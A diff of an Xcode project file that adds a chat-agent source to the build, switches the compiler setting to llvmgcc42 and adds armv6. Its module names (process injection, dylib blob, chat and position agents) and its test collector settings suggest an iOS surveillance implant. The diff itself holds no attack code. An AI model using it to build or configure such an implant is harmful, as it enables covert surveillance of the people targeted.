@@ -217,6 +217,7 @@
 		CC04D34B15E2209A00B12C6D /* RCSIGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CC04D34A15E2209A00B12C6D /* RCSIGlobals.m */; };
 		CC1B55DF15C035A800EDD3F4 /* RCSIAgentChat.m in Sources */ = {isa = PBXBuildFile; fileRef = CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */; };
 		CC386BF715F1096400E644F6 /* RCSIGlobals.m in Sources */ = {isa = PBXBuildFile; fileRef = CC04D34A15E2209A00B12C6D /* RCSIGlobals.m */; };
+		CC54E4911600B6F90091E0D2 /* RCSIAgentChat.m in Sources */ = {isa = PBXBuildFile; fileRef = CC1B55DE15C035A800EDD3F4 /* RCSIAgentChat.m */; };
 		CCBEFEAC15B6B02C00951F6D /* RCSIAgentPositionSupport.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A19BEB4107C9A300060F679 /* RCSIAgentPositionSupport.m */; };
 /* End PBXBuildFile section */
 
@@ -727,9 +728,9 @@
 		29B97315FDCFA39411CA2CEA /* ios-core */ = {
 			isa = PBXGroup;
 			children = (
+				1AC0E212105692A600DCFA55 /* Categories */,
 				1AC0E2101056927500DCFA55 /* Support */,
 				1AC0E2111056927A00DCFA55 /* Modules */,
-				1AC0E212105692A600DCFA55 /* Categories */,
 				1AC0E20F1056926900DCFA55 /* Main */,
 			);
 			name = "ios-core";
@@ -1275,6 +1276,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				CC54E4911600B6F90091E0D2 /* RCSIAgentChat.m in Sources */,
 				CC386BF715F1096400E644F6 /* RCSIGlobals.m in Sources */,
 				5233A623156F7180008D80D0 /* RCSIDylibBlob.m in Sources */,
 				52071405154AEF0500FB341F /* RCSIProcInjection.c in Sources */,
@@ -1449,7 +1451,7 @@
 				GCC_OPTIMIZATION_LEVEL = 0;
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = RCSIphone_Prefix.pch;
-				GCC_VERSION = 4.2;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
 				INFOPLIST_FILE = "";
 				INFOPLIST_PREPROCESSOR_DEFINITIONS = "-weak-lEventKit";
 				IPHONEOS_DEPLOYMENT_TARGET = 3.0;
@@ -1466,7 +1468,7 @@
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
 				RCS_TEST_DEVICE_ADDRESS = 127.0.0.1;
-				RCS_TEST_INSTANCE = RCS_0000001187;
+				RCS_TEST_INSTANCE = RCS_0000001196;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SHLIB_DIR = /Users/armored/ios_debug;
 				RCS_TEST_SYNCH = YES;
@@ -1491,7 +1493,7 @@
 				);
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = RCSIphone_Prefix.pch;
-				GCC_VERSION = 4.2;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
 				INFOPLIST_FILE = "";
 				INFOPLIST_PREPROCESSOR_DEFINITIONS = "-weak-lEventKit";
 				LIBRARY_SEARCH_PATHS = (
@@ -1507,7 +1509,7 @@
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				RCS_TEST_COLLECTOR = 192.168.100.100;
 				RCS_TEST_DEVICE_ADDRESS = 127.0.0.1;
-				RCS_TEST_INSTANCE = RCS_0000001187;
+				RCS_TEST_INSTANCE = RCS_0000001196;
 				RCS_TEST_PASSWD = ios_test;
 				RCS_TEST_SHLIB_DIR = /Users/armored/ios_debug;
 				RCS_TEST_SYNCH = YES;
@@ -1524,7 +1526,10 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
-				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				ARCHS = (
+					"$(ARCHS_STANDARD_32_BIT)",
+					armv6,
+				);
 				CODE_SIGN_ENTITLEMENTS = "ios-test-app/Entitlements.entitlements";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
 				COPY_PHASE_STRIP = NO;
@@ -1535,8 +1540,8 @@
 				GCC_PREFIX_HEADER = "ios-test-app/ios-test-app-Prefix.pch";
 				GCC_PREPROCESSOR_DEFINITIONS = "$(inherited)";
 				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
-				GCC_VERSION = 4.2;
-				GCC_WARN_ABOUT_MISSING_PROTOTYPES = YES;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
+				GCC_WARN_ABOUT_MISSING_PROTOTYPES = NO;
 				INFOPLIST_FILE = "ios-test-app/ios-test-app-Info.plist";
 				INFOPLIST_PREPROCESSOR_DEFINITIONS = "-weak-lEventKit";
 				IPHONEOS_DEPLOYMENT_TARGET = 3.0;
@@ -1565,15 +1570,18 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
-				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				ARCHS = (
+					"$(ARCHS_STANDARD_32_BIT)",
+					armv6,
+				);
 				CODE_SIGN_ENTITLEMENTS = "ios-test-app/Entitlements.entitlements";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "";
 				COPY_PHASE_STRIP = YES;
 				GCC_C_LANGUAGE_STANDARD = gnu99;
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = "ios-test-app/ios-test-app-Prefix.pch";
-				GCC_VERSION = 4.2;
-				GCC_WARN_ABOUT_MISSING_PROTOTYPES = YES;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
+				GCC_WARN_ABOUT_MISSING_PROTOTYPES = NO;
 				INFOPLIST_FILE = "ios-test-app/ios-test-app-Info.plist";
 				INFOPLIST_PREPROCESSOR_DEFINITIONS = "-weak-lEventKit";
 				IPHONEOS_DEPLOYMENT_TARGET = 3.0;
@@ -1617,7 +1625,7 @@
 					"$(inherited)",
 				);
 				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
-				GCC_VERSION = 4.2;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
 				GCC_WARN_ABOUT_MISSING_PROTOTYPES = YES;
 				INFOPLIST_FILE = "";
 				INSTALL_PATH = "";
@@ -1646,7 +1654,7 @@
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = "camera/camera-Prefix.pch";
 				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
-				GCC_VERSION = 4.2;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
 				GCC_WARN_ABOUT_MISSING_PROTOTYPES = YES;
 				INFOPLIST_FILE = "";
 				INSTALL_PATH = "";
@@ -1685,7 +1693,7 @@
 					"$(inherited)",
 				);
 				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
-				GCC_VERSION = 4.2;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
 				GCC_WARN_ABOUT_MISSING_PROTOTYPES = YES;
 				INFOPLIST_FILE = "";
 				IPHONEOS_DEPLOYMENT_TARGET = 3.0;
@@ -1722,7 +1730,7 @@
 				GCC_ENABLE_SYMBOL_SEPARATION = NO;
 				GCC_PRECOMPILE_PREFIX_HEADER = NO;
 				GCC_PREFIX_HEADER = "";
-				GCC_VERSION = 4.2;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
 				GCC_WARN_ABOUT_MISSING_PROTOTYPES = YES;
 				INFOPLIST_FILE = "";
 				IPHONEOS_DEPLOYMENT_TARGET = 3.0;
